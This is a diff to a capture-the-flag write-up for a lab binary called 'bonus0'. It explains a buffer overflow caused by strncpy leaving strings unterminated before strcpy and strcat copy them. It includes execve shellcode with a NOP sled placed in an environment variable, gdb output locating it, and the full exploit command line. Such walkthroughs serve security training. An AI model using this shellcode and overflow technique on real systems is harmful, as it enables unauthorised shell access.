@@ -1,11 +1,11 @@
 Opening the binary in [dogbolt](https://dogbolt.org/) show us the vulnerability that we will exploit.
 We see that the function `pp` call a function `p` to fill two string defined in `pp`.
 
-In the function `p` we see that it read more that it return (read 4095 char return 20 char) since the function use a `strncpy` to return a new string and that `strncpy` does not put a `\0` at the end of the string, if you copy a string where it length is equal or greater than than length given in parameter to `strncpy`
+In the function `p` we see that it read more that it return (read 4095 char return 20 char) since the function use a `strncpy` to return a new string and that `strncpy` does not put a `\0` at the end of the string, if you copy a string where it length is equal or greater than the length given in parameter to `strncpy`
 
 In the `pp` function we see that it use a `strcpy` to copy the first input in a buffer `dest`. We know that this `strcpy` copy chars until a `\0`. The function return the result `strcat` between `dest` and the second input.
 
-We will use the way `strcpy` copy until a `\0` with the fact that `strncpy` don't put a `\0` in some case to create an overflow in `dest`:
+We will use the way `strcpy` copy until a `\0` with the fact that `strncpy` don't put a `\0` in some case to put input1 + input2 in `dest`. After `strcat` `dest` will overflow: `len(dest)` ==  42 < `len(input 1) + len(input 2) + 1 + len(input 2)`
 The program will do something like:
 [Input 1][Input 2] [Input 2]
 
@@ -24,20 +24,22 @@ Program received signal SIGSEGV, Segmentation fault.
 ```
 This give us the offset of : 9
 
-We will put a shell code in our environment since there is not the size needed to put it after the offset
+We will put a shell code in our environment since there is not the size needed to put it after the offset.
+
+We will place a NOP sled before the shellcode  to facilitate it's finding, since NOP instruction perform no operation, the execution will go through the NOP sled until our shellcode.
 ``` Shell
 export SHELLCODE=$(python -c 'print "\x90" * 100 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80"')
 ```
 
-We find an address in the middle of the nopsled using gdb:
-```Shell
+We find an address in the middle of the NOP sled using gdb:
+```
 (gdb) x/s *((char **)environ)
 0xbffff888:      "SHELLCODE=\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\061\300Ph//shh/bin\211\343\211\301\211°\v̀1\300@̀"
 (gdb) x/s 0xbffff899
 0xbffff899:      "\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\061\300Ph//shh/bin\211\343\211\301\211°\v̀1\300@̀"
 ```
 
-First arg:           Second arg:
+First arg:          |Second arg:
 [fill the first arg]|[offset][address of the shellcode][fill the rest]
 ```
 (python -c 'print "A" * 20'; python -c 'print "B" * 9 + "\xd8\xf7\xff\xbf" + "B"*7'; cat) | ./bonus0
